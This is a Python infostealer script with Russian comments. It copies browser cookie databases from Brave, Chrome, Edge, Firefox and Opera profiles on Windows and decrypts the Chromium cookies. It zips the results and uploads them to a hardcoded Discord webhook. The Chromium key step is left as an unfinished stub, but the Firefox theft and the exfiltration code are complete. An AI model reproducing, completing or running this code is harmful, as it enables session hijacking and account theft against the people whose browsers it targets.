mport os
import sqlite3
import shutil
import tempfile
import zipfile
import requests
from Crypto.Cipher import AES
import base64
import json
import re
from pathlib import Path

# ----- НАСТРОЙКИ -----
WEBHOOK_URL = "https://discord.com/api/webhooks/1448849190988808223/tZETwDo54A6YEZQObh8hu_zbJiIjgQbBoKQp7io-07z9t3tI8NWKkRD53-iXalLm8a2x"
USER_DATA_PATHS = {
    "brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
    "chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
    "edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
    "firefox": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
    "opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
    "opera_gx": os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")
}

# ----- ФУНКЦИЯ ДЕШИФРАЦИИ ИЗ injector_template.py (упрощённая) -----
def decrypt_value(encrypted_value, key):
    """
    Расшифровывает cookie Chrome/Brave/Edge (AES-GCM v20)
    """
    if not encrypted_value.startswith(b'v20'):
        return None
    nonce = encrypted_value[3:15]
    ciphertext = encrypted_value[15:-16]
    tag = encrypted_value[-16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
    # Пропускаем 32-байтовый заголовок
    return decrypted[32:].decode('utf-8', errors='ignore')

def get_chrome_key(profile_path):
    """Получает мастер-ключ из Local State"""
    local_state_path = os.path.join(profile_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # убираем 'DPAPI'
    # Здесь нужна DPAPI расшифровка. Для простоты — заглушка.
    # Реальная реализация требует ctypes.windll.crypt32
    return None  # TODO: реализовать DPAPI

def extract_cookies_chromium(browser_name, profile_path, key):
    """Извлекает и расшифровывает cookies для Chromium-браузеров"""
    cookies_file = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_file):
        cookies_file = os.path.join(profile_path, "Cookies")
    if not os.path.exists(cookies_file):
        return []
    temp_dir = tempfile.mkdtemp()
    temp_cookies = os.path.join(temp_dir, "Cookies.db")
    shutil.copy2(cookies_file, temp_cookies)
    conn = sqlite3.connect(temp_cookies)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cursor.fetchall()
    conn.close()
    shutil.rmtree(temp_dir)
    cookies = []
    for host, name, enc_val in rows:
        if enc_val:
            decrypted = decrypt_value(enc_val, key)
            if decrypted:
                cookies.append(f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{decrypted}")
    return cookies

def extract_cookies_firefox(profile_path):
    """Извлекает cookies Firefox (без расшифровки master password)"""
    cookies_file = os.path.join(profile_path, "cookies.sqlite")
    if not os.path.exists(cookies_file):
        return []
    temp_dir = tempfile.mkdtemp()
    temp_cookies = os.path.join(temp_dir, "cookies.sqlite")
    shutil.copy2(cookies_file, temp_cookies)
    conn = sqlite3.connect(temp_cookies)
    cursor = conn.cursor()
    cursor.execute("SELECT host, name, value FROM moz_cookies")
    rows = cursor.fetchall()
    conn.close()
    shutil.rmtree(temp_dir)
    return [f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{value}" for host, name, value in rows]

def extract_cookies_opera(profile_path):
    """Opera использует тот же формат, что Chrome"""
    # Упрощённо — возвращаем пустой список, требует ключ
    return []

def steal_all_cookies():
    """Собирает cookies со всех браузеров и упаковывает в ZIP"""
    all_cookies = []
    # Chromium браузеры
    for browser, path in USER_DATA_PATHS.items():
        if browser in ["brave", "chrome", "edge"] and os.path.exists(path):
            key = get_chrome_key(path)  # В реальности нужно получить ключ
            if not key:
                continue
            for profile in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    cookies = extract_cookies_chromium(browser, profile_path, key)
                    if cookies:
                        all_cookies.extend(cookies)
    # Firefox
    if os.path.exists(USER_DATA_PATHS["firefox"]):
        for profile in os.listdir(USER_DATA_PATHS["firefox"]):
            profile_path = os.path.join(USER_DATA_PATHS["firefox"], profile)
            if os.path.isdir(profile_path):
                cookies = extract_cookies_firefox(profile_path)
                all_cookies.extend(cookies)
    # Opera / Opera GX
    for browser in ["opera", "opera_gx"]:
        path = USER_DATA_PATHS[browser]
        if os.path.exists(path):
            cookies = extract_cookies_opera(path)
            all_cookies.extend(cookies)
    # Создаём ZIP
    zip_path = "cookies.zip"
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for idx, cookie in enumerate(all_cookies):
            zipf.writestr(f"cookie_{idx}.txt", cookie)
    return zip_path

def send_to_discord(file_path):
    """Отправляет ZIP файл в Discord webhook"""
    with open(file_path, 'rb') as f:
        files = {'file': (os.path.basename(file_path), f, 'application/zip')}
        requests.post(WEBHOOK_URL, files=files)

if __name__ == "__main__":
    zip_file = steal_all_cookies()
    send_to_discord(zip_file)
    os.remove(zip_file)
